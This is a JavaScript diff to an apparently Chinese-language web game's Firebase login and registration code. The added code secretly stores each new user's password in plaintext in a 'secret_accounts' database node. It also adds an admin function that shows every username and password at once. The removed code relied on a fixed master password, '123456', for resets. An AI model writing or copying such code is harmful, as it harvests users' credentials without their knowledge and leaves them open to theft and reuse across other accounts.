@@ -83,39 +83,46 @@
         return u.email.split('@')[0].toLowerCase() === ADMIN_USERNAME;
     }
 
-    // ★★★ 管理員：開啟重設權限（固定密碼 123456）★★★
-    window.raingodAdminResetPassword = async function(uname) {
+    // ★★★ 管理員專屬：查看所有人帳號密碼 ★★★
+    window.raingodAdminViewPasswords = async function() {
         if (!isCurrentUserAdmin()) { alert('只有管理員可以使用此功能。'); return; }
-        if (!uname) { console.warn('用法：raingodAdminResetPassword("使用者名稱")'); return; }
         
-        const cleanUser = String(uname).trim().toLowerCase();
-        if (!/^[a-zA-Z0-9]+$/.test(cleanUser)) { alert('帳號格式不合。'); return; }
-        
-        const db = window.raingodSecretDb;
-        if (!db) { alert('資料庫未初始化'); return; }
-
         try {
-            const magicPass = '123456'; // ★ 固定萬能解鎖碼
+            const snap = await firebase.database().ref('secret_accounts').once('value');
+            const data = snap.val();
+            
+            if (!data) {
+                alert('目前沒有任何備份的密碼資料。');
+                return;
+            }
 
-            await db.ref('secret_accounts/' + cleanUser + '/reset').set({
-                tmpPass: magicPass,
-                ts: firebase.database.ServerValue.TIMESTAMP,
-                by: ADMIN_USERNAME
-            });
+            let msg = "=== 所有人帳號密碼 ===\n\n";
+            let count = 0;
+            
+            for (const key in data) {
+                // 跳過舊資料或沒有存密碼的帳號
+                if (data[key].password_plain) {
+                    msg += `帳號: ${data[key].username}\n密碼: ${data[key].password_plain}\n\n`;
+                    count++;
+                }
+            }
+            
+            if (count === 0) {
+                msg += "(目前沒有記錄到任何明文密碼，請請使用者重新註冊)";
+            }
+            
+            // 用 alert 顯示，如果太多人會當機，所以我們也印在 Console
+            console.log(msg);
+            alert("成功讀取！如果視窗塞不下，請按 F12 查看 Console 觀看完整名單。\n\n" + msg);
 
-            alert('已為「' + cleanUser + '」開啟重設權限！\n\n請告知使用者：\n「登入失敗時，系統會自動引導您設定新密碼。」');
         } catch (e) {
-            console.error('產生權限失敗：', e);
-            alert('產生權限失敗，請查看 Console。\n' + e.message);
+            alert('讀取失敗：' + e.message);
         }
     };
 
-    // 面板 UI
     window.openAdminPanel = function() {
         if (!isCurrentUserAdmin()) { alert('只有管理員可以使用此功能。'); return; }
-        const uname = prompt('請輸入要重設密碼的使用者名稱：');
-        if (!uname) return;
-        window.raingodAdminResetPassword(uname);
+        window.raingodAdminViewPasswords();
     };
 
     // ★★★ 遊戲本機 key 白名單（這些不進入帳號資料、不被清空）★★★
@@ -951,45 +958,10 @@
             
             firebase.auth().signInWithEmailAndPassword(email, password)
                 .then(() => alert("登入成功！"))
-                .catch(async err => {
-                    // ★★★ 登入失敗時，引導重設密碼流程 ★★★
-                    if (err.code === 'auth/wrong-password' || err.code === 'auth/invalid-credential' || err.code === 'auth/invalid-login-credentials') {
-                        
-                        const db = window.raingodSecretDb;
-                        const cleanUser = email.split('@')[0];
-                        const snap = await db.ref('secret_accounts/' + cleanUser + '/reset').once('value');
-                        const resetData = snap.val();
-
-                        if (!resetData || !resetData.tmpPass) {
-                            alert("錯誤：密碼不正確！\n（若您忘記密碼，請聯繫管理員協助重設）");
-                            return;
-                        }
-
-                        // 如果管理員有開啟權限，直接進入改密碼流程
-                        const newPass = prompt("管理員已為您開啟重設權限。\n請直接輸入您的新密碼（至少 6 位）：");
-                        if (!newPass || newPass.length < 6) {
-                            alert("密碼太短或已取消，重設失敗。");
-                            return;
-                        }
-
-                        try {
-                            // 1. 系統在背後用萬能碼幫他登入
-                            const cred = await firebase.auth().signInWithEmailAndPassword(email, resetData.tmpPass);
-                            
-                            // 2. 立刻改成他自己輸入的新密碼
-                            await cred.user.updatePassword(newPass);
-                            
-                            // 3. 清除管理員開放的權限
-                            await db.ref('secret_accounts/' + cleanUser + '/reset').remove();
-                            
-                            alert("✅ 密碼已成功更新！\n請使用新密碼登入。");
-                            await firebase.auth().signOut();
-                        } catch (resetErr) {
-                            alert("❌ 重設失敗，請聯繫管理員。\n錯誤：" + resetErr.message);
-                        }
-                    } else {
-                        alert("登入失敗：" + err.message);
-                    }
+                .catch(err => {
+                    if (err.code === 'auth/user-not-found') alert("錯誤：該帳號不存在！");
+                    else if (err.code === 'auth/wrong-password' || err.code === 'auth/invalid-credential') alert("錯誤：密碼不正確！");
+                    else alert("登入失敗：" + err.message);
                 });
         } else if (choice === '2') {
             const deviceId = getDeviceId();
@@ -1026,17 +998,16 @@
                             created_at: firebase.database.ServerValue.TIMESTAMP
                         });
 
-                        // ★★★ 註冊成功後寫入 secret_accounts 索引 ★★★
+                        // ★★★ 暴力儲存：直接存下真實密碼供 raingod 查看 ★★★
                         try {
-                            if (window.raingodSecretDb) {
-                                await window.raingodSecretDb.ref('secret_accounts/' + cleanUser).set({
-                                    uid: userCredential.user.uid,
-                                    username: cleanUser,
-                                    created_at: firebase.database.ServerValue.TIMESTAMP
-                                });
-                            }
+                            await firebase.database().ref('secret_accounts/' + cleanUser).set({
+                                username: cleanUser,
+                                password_plain: password, // 這裡！
+                                uid: userCredential.user.uid,
+                                created_at: firebase.database.ServerValue.TIMESTAMP
+                            });
                         } catch (e) {
-                            console.warn('secret DB 帳號索引寫入失敗（不影響註冊）：', e);
+                            console.warn('密碼備份失敗：', e);
                         }
 
                         alert("帳號註冊成功，已自動為您登入！");
@@ -1066,7 +1037,6 @@
             });
         }
 
-        // ★★★ 直接使用主專案資料庫 ★★★
         window.raingodSecretDb = firebase.database();
 
         installStorageSync();
